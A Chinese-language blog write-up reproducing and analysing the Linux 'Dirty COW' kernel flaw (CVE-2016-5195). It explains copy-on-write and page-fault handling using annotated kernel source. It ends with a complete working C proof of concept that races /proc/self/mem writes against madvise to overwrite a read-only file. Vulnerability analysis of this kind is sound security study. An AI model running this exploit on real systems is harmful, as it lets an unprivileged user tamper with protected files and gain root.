# CVE-2016-5195 复现&分析

> CVE-2016-5195 也就是平时所说的“脏牛” "dirtyCOW"

[TOC]

## 0x00 Pre 

### [1] 写时复制机制（Copy-on-Write）

> 写入时复制（COW），有时也称为隐式共享，是一种计算机管理中用来有效地对可修改资源执行“复制”操作的资源管理技术。
>
> 如果资源重复但未修改，则无需创建新资源，资源可以在副本和原始副本之间共享。
>
> 修改仍然必须创建一个副本，因此使用COW，可以将复制操作推迟到第一次写入。
>
> 通过以这种方式共享资源，可以显着减少未修改副本的资源消耗，当然了资源修改操作的时候也会增加少量开销。

#### 1.基础COW

Linux下传统的fork调用时，子线程会复制父线程的数据段，堆栈段的虚拟内存，重新映射到新的物理内存，共享只读的代码地址虚拟和物理空间

![](https://pic1.imgdb.cn/item/63350b1b16f2c2beb1f82206.png)

而为了减少内存开销，后来的Linux系统引入了COW机制，也就是[写时复制]

**「父进程与子进程共享所有的页框」而不是直接为子进程分配新的页框，「只有当任意一方尝试修改某个页框」的内容时内核才会为其分配一个新的页框，并将原页框中内容进行复制**

- 在 `fork()` 系统调用之后，父子进程共享所有的页框，内核会将这些页框**全部标为read-only**
- 由于所有页框被标为**只读**，当任意一方尝试修改某个页框时，便会触发**「缺页异常」**（page fault）——此时内核才会为其分配一个新的页框

只有当某个进程尝试修改共享内存时，内核才会为其分配新的页框，以此大幅度减少系统的开销，达到性能优化的效果

![](https://pic1.imgdb.cn/item/63350c3716f2c2beb1f92d2b.png)

#### 2. mmap和cow

同样地，若是我们使用 mmap 映射了一个只具有读权限而不具有写权限的文件，当我们尝试向 mmap 映射区域写入内容时，也会触发写时复制机制，将该文件内容拷贝一份到内存中，此时进程对这块区域的读写操作便不会影响到硬盘上的文件

### [2] 缺页异常（page fault）

> 从内核角度来看，逻辑地址和物理地址都被划分成为固定大小的页面。每个合法的逻辑页面敲好处于一个物理页面中，方便MMU的地址转换。**当地址转换无法完成时(例如由于给定的逻辑地址不合法或由于逻辑页面没有对应的物理页面)，MMU将产生中断，向核心发出信号。Linux核心可以处理这种页面错误(`Page Fault`)问题**。

主要触发的情况如下：

1. 地址空间映射关系未建立
   1.1：malloc/mmap申请虚拟的地址空间并未分配实际物理页，首次访问触发缺页异常。
2. 地址空间映射关系已建立
   2.1：要访问的页面已经被swapping到了磁盘，访问时触发缺页异常。
   2.2：fork子进程时，子进程共享父进程的地址空间，写是触发缺页异常(COW技术)。
   2.3：要访问的页面被KSM合并，写时触发缺页异常(COW技术)。
   2.4：兼容的ARM32体系架构模拟PTE_DIRTY PTE_YOUNG比特。
3. 访问的地址空间不合法
   3.1：用户空间访问内核空间地址，触发缺页异常。
   3.2：内核空间访问用户空间地址，触发缺页异常。(不包括copy_to/from_user的情况)

![](https://lrita.github.io/images/posts/memory/page-fault-interrupt.png)

#### 1.  分配页表项：__handle_mm_fault()

````c
/*
 * By the time we get here, we already hold the mm semaphore
 *
 * The mmap_sem may have been released depending on flags and our
 * return value.  See filemap_fault() and __lock_page_or_retry().
 */
static int __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,
			     unsigned long address, unsigned int flags)
{
    //Linux使用四级页表结构
	pgd_t *pgd;//页全局目录项
	pud_t *pud;//页上级目录项
	pmd_t *pmd;//页中间目录项
	pte_t *pte;//页表项
    
    //以下为页表相关处理

	if (unlikely(is_vm_hugetlb_page(vma)))
		return hugetlb_fault(mm, vma, address, flags);

	pgd = pgd_offset(mm, address);//获取全局页表项
	pud = pud_alloc(mm, pgd, address);//分配上级页表项（分配一页新的内存作为pud）
	if (!pud)//失败了，返回
		return VM_FAULT_OOM;
	pmd = pmd_alloc(mm, pud, address);//分配中间页表项分配一页新的内存作为pmd）
	if (!pmd)//失败了，返回
		return VM_FAULT_OOM;
	if (pmd_none(*pmd) && transparent_hugepage_enabled(vma)) {
		int ret = create_huge_pmd(mm, vma, address, pmd, flags);//创建页表中间项？
		if (!(ret & VM_FAULT_FALLBACK))//失败了，返回
			return ret;
	} else {
		pmd_t orig_pmd = *pmd;
		int ret;

		barrier();
		if (pmd_trans_huge(orig_pmd)) {
			unsigned int dirty = flags & FAULT_FLAG_WRITE;

			/*
			 * If the pmd is splitting, return and retry the
			 * the fault.  Alternative: wait until the split
			 * is done, and goto retry.
			 */
			if (pmd_trans_splitting(orig_pmd))
				return 0;

			if (pmd_protnone(orig_pmd))
				return do_huge_pmd_numa_page(mm, vma, address,
							     orig_pmd, pmd);

			if (dirty && !pmd_write(orig_pmd)) {
				ret = wp_huge_pmd(mm, vma, address, pmd,
							orig_pmd, flags);
				if (!(ret & VM_FAULT_FALLBACK))
					return ret;
			} else {
				huge_pmd_set_accessed(mm, vma, address, pmd,
						      orig_pmd, dirty);
				return 0;
			}
		}
	}

	/*
	 * Use __pte_alloc instead of pte_alloc_map, because we can't
	 * run pte_offset_map on the pmd, if an huge pmd could
	 * materialize from under us from a different thread.
	 */
	if (unlikely(pmd_none(*pmd)) &&
	    unlikely(__pte_alloc(mm, vma, pmd, address)))
		return VM_FAULT_OOM;
	/* if an huge pmd materialized from under us just retry later */
	if (unlikely(pmd_trans_huge(*pmd)))
		return 0;
	/*
	 * A regular pmd is established and it can't morph into a huge pmd
	 * from under us anymore at this point because we hold the mmap_sem
	 * read mode and khugepaged takes it in write mode. So now it's
	 * safe to run pte_offset_map().
	 */
	pte = pte_offset_map(pmd, address);//获取到最终的页表项

	return handle_pte_fault(mm, vma, address, pte, pmd, flags);//核心处理函数
}
````

该函数为触发缺页异常的线性地址address分配各级的页目录，在这里的pgd表会直接使用该进程的 `mm_struct` 中的 pgd 表，但是pud、pmd表都存在着创建新表的可能

此时我们已经有了与触发缺页异常的地址相对应的页表项（PTE），接下来我们将进入 `handle_pte_fault()` 函数进行下一步

#### 2. 处理页表项：handle_pte_fault()

该函数同样定义于 `mm/memory.c` 中，如下：

````c
/*
 * These routines also need to handle stuff like marking pages dirty
 * and/or accessed for architectures that don't do it in hardware (most
 * RISC architectures).  The early dirtying is also good on the i386.
 *
 * There is also a hook called "update_mmu_cache()" that architectures
 * with external mmu caches can use to update those (ie the Sparc or
 * PowerPC hashed page tables that act as extended TLBs).
 *
 * We enter with non-exclusive mmap_sem (to exclude vma changes,
 * but allow concurrent faults), and pte mapped but not yet locked.
 * We return with pte unmapped and unlocked.
 *
 * The mmap_sem may have been released depending on flags and our
 * return value.  See filemap_fault() and __lock_page_or_retry().
 */
static int handle_pte_fault(struct mm_struct *mm,
		     struct vm_area_struct *vma, unsigned long address,
		     pte_t *pte, pmd_t *pmd, unsigned int flags)
{
	pte_t entry;
	spinlock_t *ptl;

	/*
	 * some architectures can have larger ptes than wordsize,
	 * e.g.ppc44x-defconfig has CONFIG_PTE_64BIT=y and CONFIG_32BIT=y,
	 * so READ_ONCE or ACCESS_ONCE cannot guarantee atomic accesses.
	 * The code below just needs a consistent view for the ifs and
	 * we later double check anyway with the ptl lock held. So here
	 * a barrier will do.
	 */
	entry = *pte;//获取页表项中的内存页
	barrier();
    //该页不在主存中
	if (!pte_present(entry)) {//pte中内存页所映射的物理地址（*pte）不存在，可能是调页请求
		if (pte_none(entry)) {//pte中内容为空，表示进程第一次访问该页
			if (vma_is_anonymous(vma))//vma为匿名区域，分配物理页框，初始化为全0
				return do_anonymous_page(mm, vma, address,
							 pte, pmd, flags);
			else
				return do_fault(mm, vma, address, pte, pmd,
						flags, entry);//非匿名区域，分配物理页框
		}
		return do_swap_page(mm, vma, address,
					pte, pmd, flags, entry);//说明该页之前存在于主存中，但是被换到外存了（太久没用被放到了交换空间里？），那就再换回来就行
	}

    //该页在主存中
	if (pte_protnone(entry)) // 查看 pte 是否有 _PAGE_PROTNONE 标志位
		return do_numa_page(mm, vma, address, entry, pte, pmd);

	ptl = pte_lockptr(mm, pmd);
	spin_lock(ptl);//自旋锁，多线程操作
	if (unlikely(!pte_same(*pte, entry)))
		goto unlock;
	if (flags & FAULT_FLAG_WRITE) {// 存在 FAULT_FLAG_WRITE 标志位，表示缺页异常由写操作引起
		if (!pte_write(entry))//对应的页不可写
			return do_wp_page(mm, vma, address,
					pte, pmd, ptl, entry);//进行写时复制，将内容写入由 do_fault()->do_cow_fault()分配的内存页中
		entry = pte_mkdirty(entry);//将该页【标脏】
	}
	entry = pte_mkyoung(entry);//将该页标干净？
	if (ptep_set_access_flags(vma, address, pte, entry, flags & FAULT_FLAG_WRITE)) {
		update_mmu_cache(vma, address, pte);//pte内容发生变化，将新内容写入pte页表项中
	} else {
		/*
		 * This is needed only for protection faults but the arch code
		 * is not yet telling us if this is a protection fault or not.
		 * This still avoids useless tlb flushes for .text page faults
		 * with threads.
		 */
		if (flags & FAULT_FLAG_WRITE)
			flush_tlb_fix_spurious_fault(vma, address);
	}
unlock:
	pte_unmap_unlock(pte, ptl);//解自旋锁
	return 0;
}
````

- 或许页表项中内存页
- 该页不在主存中[1]
  - pte项为空，表示进程第一次访问该页，未与物理页建立映射关系
    - 该页为匿名页，分配内容初始化为0的页框
    - 该页不为匿名页，调用 `do_fault()` 进行进一步的分配操作
  - pte项不为空，说明该页此前访问过，但是被换到交换空间（外存）里了（太久没用？），此时只需将该页交换回来即可
- 该页在主存中[2]
  - 缺页异常由【写】操作引起
    - 对应页不可写，调用 `do_wp_page()` 进行写时复制
    - 对应页可写，标脏
  - 将新内容写入pte页表项中

那么我们不难看出，当一个进程首次访问一个内存页时应当会触发两次缺页异常，第一次走[1]，第二次走[2]，后面再进行进一步的分析

#### 3. 处理写时复制（无内存页）： do_cow_fault()

本篇主要关注写时复制的过程；COW流程在第一次写时触发缺页异常最终便会进入到 `do_cow_fault()` 中处理，该函数同样位于 `mm/memory.c` 中

````c
static int do_cow_fault(struct mm_struct *mm, struct vm_area_struct *vma,
		unsigned long address, pmd_t *pmd,
		pgoff_t pgoff, unsigned int flags, pte_t orig_pte)
{
	struct page *fault_page, *new_page;
	struct mem_cgroup *memcg;
	spinlock_t *ptl;
	pte_t *pte;
	int ret;

	if (unlikely(anon_vma_prepare(vma)))
		return VM_FAULT_OOM;

	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);//分配新物理页
	if (!new_page)//失败了
		return VM_FAULT_OOM;

	if (mem_cgroup_try_charge(new_page, mm, GFP_KERNEL, &memcg)) {
		page_cache_release(new_page);
		return VM_FAULT_OOM;
	}

	ret = __do_fault(vma, address, pgoff, flags, new_page, &fault_page);//读取文件内容到fault_page
	if (unlikely(ret & (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))
		goto uncharge_out;

	if (fault_page)
		copy_user_highpage(new_page, fault_page, address, vma);//拷贝fault_page内容到new_page
	__SetPageUptodate(new_page);

	pte = pte_offset_map_lock(mm, pmd, address, &ptl);//多线程操作，上锁？
	if (unlikely(!pte_same(*pte, orig_pte))) {//pte和orig_pte不一致，说明中间有人修改了pte，那么释放fault_page和new_page页面并退出
		pte_unmap_unlock(pte, ptl);
		if (fault_page) {
			unlock_page(fault_page);
			page_cache_release(fault_page);
		} else {
			/*
			 * The fault handler has no page to lock, so it holds
			 * i_mmap_lock for read to protect against truncate.
			 */
			i_mmap_unlock_read(vma->vm_file->f_mapping);
		}
		goto uncharge_out;
	}
	do_set_pte(vma, address, new_page, pte, true, true);//设置pte，置换该进程中的pte表项，对于写操作会将该页标脏（该函数会调用maybe_mkwrite()函数，其会调用pte_mkdirty()函数标脏该页）
	mem_cgroup_commit_charge(new_page, memcg, false);
	lru_cache_add_active_or_unevictable(new_page, vma);
	pte_unmap_unlock(pte, ptl);
	if (fault_page) {
		unlock_page(fault_page);//释放fault_page
		page_cache_release(fault_page);
	} else {
		/*
		 * The fault handler has no page to lock, so it holds
		 * i_mmap_lock for read to protect against truncate.
		 */
		i_mmap_unlock_read(vma->vm_file->f_mapping);
	}
	return ret;
uncharge_out:
	mem_cgroup_cancel_charge(new_page, memcg);
	page_cache_release(new_page);
	return ret;
}
````

#### 4. 处理写时复制（有内存页）：do_wp_page()

当通过 `do_fault()` 获取内存页之后，第二次触发缺页异常时便会最终交由 `do_wp_page()` 函数处理，该函数同样位于 `mm/memory.c` 中

````c
/*
 * This routine handles present pages, when users try to write
 * to a shared page. It is done by copying the page to a new address
 * and decrementing the shared-page counter for the old page.
 *
 * Note that this routine assumes that the protection checks have been
 * done by the caller (the low-level page fault routine in most cases).
 * Thus we can safely just mark it writable once we've done any necessary
 * COW.
 *
 * We also mark the page dirty at this point even though the page will
 * change only once the write actually happens. This avoids a few races,
 * and potentially makes it more efficient.
 *
 * We enter with non-exclusive mmap_sem (to exclude vma changes,
 * but allow concurrent faults), with pte both mapped and locked.
 * We return with mmap_sem still held, but pte unmapped and unlocked.
 */
static int do_wp_page(struct mm_struct *mm, struct vm_area_struct *vma,
		unsigned long address, pte_t *page_table, pmd_t *pmd,
		spinlock_t *ptl, pte_t orig_pte)
	__releases(ptl)
{
	struct page *old_page;//原有的页

	old_page = vm_normal_page(vma, address, orig_pte);//获取缺页的线性地址对应的struct page结构，对于一些特殊映射的页面（如页面回收、页迁移和KSM等），内核并不希望这些页参与到内存管理的一些流程当中，称之为 special mapping，并无对应的struct page结构体
	if (!old_page) {//NULL，说明是一个 special mapping 页面；否则说明是normal mapping页面
		/*
		 * VM_MIXEDMAP !pfn_valid() case, or VM_SOFTDIRTY clear on a
		 * VM_PFNMAP VMA.
		 *
		 * We should not cow pages in a shared writeable mapping.
		 * Just mark the pages writable and/or call ops->pfn_mkwrite.
		 */
		if ((vma->vm_flags & (VM_WRITE|VM_SHARED)) ==
				     (VM_WRITE|VM_SHARED))
			return wp_pfn_shared(mm, vma, address, page_table, ptl,
					     orig_pte, pmd);

		pte_unmap_unlock(page_table, ptl);
		return wp_page_copy(mm, vma, address, page_table, pmd,
				    orig_pte, old_page);
	}

	/*
	 * Take out anonymous pages first, anonymous shared vmas are
	 * not dirty accountable.
	 */
    //先处理匿名页面
	if (PageAnon(old_page) && !PageKsm(old_page)) {//原页面为匿名页面 && 不是ksm页面
		if (!trylock_page(old_page)) {//多线程相关操作，判断是否有其他线程的竞争
			page_cache_get(old_page);
			pte_unmap_unlock(page_table, ptl);
			lock_page(old_page);
			page_table = pte_offset_map_lock(mm, pmd, address,
							 &ptl);
			if (!pte_same(*page_table, orig_pte)) {
				unlock_page(old_page);
				pte_unmap_unlock(page_table, ptl);
				page_cache_release(old_page);
				return 0;
			}
			page_cache_release(old_page);
		}
        //此时没有其他线程与本线程竞争了，调用 reuse_swap_page() 判断使用该页的是否只有一个进程，若是的话就直接重用该页
		if (reuse_swap_page(old_page)) {
			/*
			 * The page is all ours.  Move it to our anon_vma so
			 * the rmap code will not search our parent or siblings.
			 * Protected against the rmap code by the page lock.
			 */
			page_move_anon_rmap(old_page, vma, address);
			unlock_page(old_page);
			return wp_page_reuse(mm, vma, address, page_table, ptl,
					     orig_pte, old_page, 0, 0);//一般的cow流程会走到这里，重用由do_cow_fault()分配好的内存页，不会再开辟新页
		}
		unlock_page(old_page);
	} else if (unlikely((vma->vm_flags & (VM_WRITE|VM_SHARED)) ==
					(VM_WRITE|VM_SHARED))) {
		return wp_page_shared(mm, vma, address, page_table, pmd,
				      ptl, orig_pte, old_page);
	}

	/*
	 * Ok, we need to copy. Oh, well..
	 */
    //实在没法重用了，进行写时复制
	page_cache_get(old_page);

	pte_unmap_unlock(page_table, ptl);
	return wp_page_copy(mm, vma, address, page_table, pmd,
			    orig_pte, old_page);
}
````

我们不难看出其核心思想是尝试重用内存页，实在没法重用时才会进行写时复制

### [3] COW 与 缺页异常相关流程

当我们使用mmap映射一个只读文件，随后开辟一个新进程，尝试通过 `/proc/self/mem` 文件直接往一个原有的共享页面写入内容时，其流程应当如下：

#### 1. sys_write

用户态的 `write` 系统调用最终对应的是内核中的 `sys_write()`

````c
entry_SYSCALL_64()
	sys_write()
		vfs_write()
			__vfs_write()
				file->f_op->write()//该文件于内核中的文件描述符的file_operations结构体，类似于一张函数表，储存了默认的对于一些系统调用的处理函数指针
````

####  2. /proc/self/mem：绕过页表项权限

“脏牛”通常利用的是 `/proc/self/mem` 进行越权写入，这也是整个“脏牛”利用中较为核心的流程

对于该文件的写入，通常的调用链是：

````c
mem_write()//套娃，调用下一层的mem_rw()
	mem_rw()//核心函数，分配页 + 拷贝数据（copy_from_user()）
````

对于mem_rw(),调用流程如下：

- 判断该文件对应的内存描述符是否为空，第一次进入时为空，返回上层，分配一个对应的 `mm_struct` 后会重新进入该函数
- 调用 `__get_free_page()` 函数分配一个空闲的内存页作为临时储存用户数据的空间
- 调用 `access_remote_vm()` 函数进行内存访问操作，根据传入的 `write` 参数进行读/写内存页面操作

- 通过 `get_user_pages()` 获取到对应的内存页（注意这里获取的是 `page` 结构体，因为该物理页不一定有映射）
- 通过 `kmap()` 或许到该内存页映射到的虚拟地址（若无则会建立新的临时映射）
- 通过 `copy_from_user_page()/copy_to_user_page()` 读/写对应的内存页

COW的两个要点：

- 在我们第一次尝试访问某个内存页时，由于延迟绑定机制，Linux尚未建立起该页与对应物理页间的映射，此时 `follow_page_mask()` 返回 NULL；由于没获取到对应内存页，接下来调用 `faultin_page()` 函数解决缺页异常，分配物理页
- 调用 `faultin_page()` 函数成功解决缺页异常之后会回到 `retry` 标签，接下来会重新调用 `follow_page_mask()` ，而若是当前进程对于该页没有写权限（二级页表标记为不可写），则还是会返回NULL；由于没获取到对应内存页，接下来调用 `faultin_page()` 函数解决缺页异常，进行写时复制

所以`mem_rw()`的流程如下：

```c
mem_rw()
	__get_free_page()//获取空闲页，将要写入的数据进行拷贝
	access_remote_vm()
		__access_remote_vm()// 写入数据，执行 write 这一系统调用的核心功能
			get_user_pages()
				__get_user_pages_locked()
					__get_user_pages()//获取对应的用户进程的内存页
						follow_page_mask()//调内存页的核心函数
						faultin_page()//解决缺页异常
```

#### 3. 第一次缺页异常

由于 Linux 的延迟绑定机制，在第一次访问某个内存页之前 Linux kernel 并不会为其分配物理页，于是我们没法获取到对应的页表项， `follow_page_mask()` 返回 NULL，此时便会进入 `faultin_page()` 函数处理缺页异常.

大致流程如下：

````c
faultin_page()
    handle_mm_fault()
        __handle_mm_fault()
            handle_pte_fault()//发现pte为空，第一次访问该页
                do_fault()//非匿名页，直接调入
                    do_cow_fault()//我们要写入该页，所以走到了这里
                    	do_set_pte()
                            maybe_mkwrite()
                                pte_mkdirty()//将该页标脏
````

之后该页被调入主存中，但是此时我们并无对该页的写权限

#### 4. 第二次缺页异常

虽然我们成功调入了内存页，但是由于我们对该页并无写权限， `follow_page_mask()` 依旧会返回 NULL ，再次触发缺页异常，于是我们再次进入 `faultin_page()` 函数，来到了**「写时复制」**的流程，细节在前面已经分析过了，这里便不再赘叙

由于这一次成功获取到了一个可写的内存页，此时 `faultin_page()` 函数会清除 `foll_flags` 的 `FOLL_WRITE` 标志位

大致流程如下：

````c
faultin_page()
    handle_mm_fault()
        __handle_mm_fault()
            handle_pte_fault()
                do_wp_page()
                	reuse_swap_page(old_page)
                		wp_page_reuse()
````

接下来的流程最终回到 `__get_user_pages()` 的 retry 标签，**第三次**尝试获取内存页，此时 `foll_flags` 的 `FOLL_WRITE` 标志位已经被清除，**内核认为该页可写**，于是 `follow_page_mask()` 函数成功获取到该内存页，接下来便是常规的写入流程， COW 结束

## 0x01 漏洞分析

既然CVE-2016-5195俗称**「dirtyCOW」**，毫无疑问漏洞出现在 COW 的过程当中

### [1] 多线程竞争

我们在通过 `follow_page_mask()` 函数获取对应的内存页之前，用以判断该内存页是否可写的逻辑是根据 `foll_flags` 的 `FOLL_WRITE` 标志位进行判断的，但是决定 从该内存页读出数据/向该内存页写入数据 则是由传入给 `mem_rw()` 函数的参数 `write` 决定的

我们来思考如下竞争过程，假如我们启动了两个线程：

- [1] 第一个线程尝试向**「仅具有读权限的mmap映射区域写入内容」**，此时便会触发缺页异常，进入到写时复制（COW）的流程当中
- [2] 第二个线程使用 `madvise()` 函数通知内核**「第一个线程要写入的那块区域标为未使用」**，此时由 COW 分配得到的新内存页将会被再次调出

### [2] 四次获取内存页 & 三次缺页异常

既然这两个线程跑在竞争态，在第一个线程走完两次缺页异常的流程之后，若是第二个线程调用 madvise() 将页表项中的该页再次调出，**第一个线程在第三次尝试获取内存页时便无法获取到内存页，便会再次触发缺页异常**，接下来进入到 `faultin_page()` 的流程获取原内存页

而 `__get_user_pages()` 函数中 `foll_flags` 的 `FOLL_WRITE` 标志位已经**在第二次尝试获取内存页、第二次触发缺页异常**被清除， 此时该函数 **第四次尝试获取内存页**，由于不存在标志位的冲突，**便可以 “正常” 获取到内存页**

接下来便回到了 `mem_rw()`的写流程，此时我们便成功绕过了 `foll_flags`对于读写的检测，成功获取到只有读权限的内存页，**完成越权写**

## 0x02 漏洞总结

当我们用mmap去映射文件到内存区域时使用了MAP_PRIVATE标记，我们写文件时会写到COW机制产生的内存区域中，原文件不受影响。其中获取用户进程内存页的过程如下：

第一次调用follow_page_mask查找虚拟地址对应的page，因为我们要求页表项要具有写权限，所以FOLL_WRITE为1。因为所在page不在内存中，follow_page_mask返回NULL，第一次失败，进入faultin_page，最终进入do_cow_fault分配不带_PAGE_RW标记的匿名内存页，返回值为0。

重新开始循环，第二次调用follow_page_mask，同样带有FOLL_WRITE标记。由于不满足((flags & FOLL_WRITE) && !pte_write(pte))条件，follow_page_mask返回NULL，第二次失败，进入faultin_page，最终进入do_wp_page函数分配COW页。并在上级函数faultin_page中去掉FOLL_WRITE标记,返回0。

重新开始循环，第三次调用follow_page_mask，不带FOLL_WRITE标记。成功得到page。但是由于进行了COW，所以写操作并不会涉及到原始内存。

上述即为正常情况下的COW过程。但是在这个过程中存在隐患，首先在__get_user_pages函数中每次查找page前会先调用cond_resched()线程调度一下，这样就引入了条件竞争的可能性。同时在第二次查找页结束时，FOLL_WRITE就已经被去掉了。如果此时我们取消内存的映射关系，第三次执行就又会像第一次执行时一样，执行do_fault函数进行页面映射。但是区别于第一次执行，这一次执行时FOLL_WRITE已被去掉，导致FAULT_FLAG_WRITE置0，所以直接执行do_read_fault。而do_read_fault函数调用了__do_fault，由于标志位的改变，所以不会通过COW进行映射，而是直接映射，得到的page带有__PAGE_DIRTY标志，产生了条件竞争。

综合上述的漏洞原理分析，我们在进行漏洞利用的时候，主要需要实现的就是在进行完第二次页面查找后取消页面的映射关系。于是得到漏洞利用流程如下：

第一次follow_page_mask(FOLL_WRITE)，page不在内存中，进行pagefault处理；

第二次follow_page_mask(FOLL_WRITE)，page没有写权限，并去掉FOLL_WRITE；

另一个线程释放上一步分配的COW页；

第三次follow_page_mask(无FOLL_WRITE)，page不在内存中，进行pagefault处理；

第四次follow_page_mask(无FOLL_WRITE),成功返回page，但没有使用COW机制。

对于取消页面映射关系，我们可以通过执行madvise(MADV_DONTNEED)实现。madvise系统调用的作用是给系统对于内存使用的一些建议，MADV_DONTNEED参数告诉系统未来不访问该内存了，内核可以释放内存页了。内核函数madvise_dontneed中会移除指定范围内的用户空间page。

最后综合上述利用思路和方法，我们需要做的就是创建两个线程，一个通过write进行页面调度，另一个通过madvise进行取消页面映射。

## 0x03 漏洞利用

有了以上思路，我们的 POC 并不算特别难写，**开两个线程来竞争**即可

我们先通过 mmap 以只读权限映射一个文件，随后尝试通过 `/proc/self/mem` 文件直接向进程的对应内存区域写入，这样便可以无视 mmap 设定的权限进行写入，从而触发 COW

````c
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>

struct stat dst_st, fk_st;
void * map;
char *fake_content;

void * madviseThread(void * argv);
void * writeThread(void * argv);

int main(int argc, char ** argv)
{
    if (argc < 3)
    {
        puts("usage: ./poc destination_file fake_file");
        return 0;
    }

    pthread_t write_thread, madvise_thread;

    int dst_fd, fk_fd;
    dst_fd = open(argv[1], O_RDONLY);
    fk_fd = open(argv[2], O_RDONLY);
    printf("fd of dst: %d\nfd of fk: %d\n", dst_fd, fk_fd);

    fstat(dst_fd, &dst_st); // get destination file length
    fstat(fk_fd, &fk_st); // get fake file length
    map = mmap(NULL, dst_st.st_size, PROT_READ, MAP_PRIVATE, dst_fd, 0);

    fake_content = malloc(fk_st.st_size);
    read(fk_fd, fake_content, fk_st.st_size);

    pthread_create(&madvise_thread, NULL, madviseThread, NULL);
    pthread_create(&write_thread, NULL, writeThread, NULL);

    pthread_join(madvise_thread, NULL);
    pthread_join(write_thread, NULL);

    return 0;
}

void * writeThread(void * argv)
{
    int mm_fd = open("/proc/self/mem", O_RDWR);
    printf("fd of mem: %d\n", mm_fd);
    for (int i = 0; i < 0x100000; i++)
    {
        lseek(mm_fd, (off_t) map, SEEK_SET);
        write(mm_fd, fake_content, fk_st.st_size);
    }

    return NULL;
}

void * madviseThread(void * argv)
{
    for (int i = 0; i < 0x100000; i++){
        madvise(map, 0x100, MADV_DONTNEED);
    }

    return NULL;
}

````



